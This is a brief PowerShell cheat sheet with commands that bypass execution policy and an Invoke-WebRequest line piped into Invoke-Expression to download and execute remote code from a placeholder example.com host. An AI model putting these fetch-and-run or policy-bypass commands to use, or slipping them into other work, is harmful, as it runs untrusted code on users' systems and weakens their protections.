## Execution Policies

    Set-ExecutionPolicy Bypass -Scope Process -Force
    Set-ExecutionPolicy RemoteSigned -Scope CurrentUser

## Download by URL

    iwr -useb http://example.com/somefile
    iwr -useb http://example.com/someexe | iex       # Download and execute it
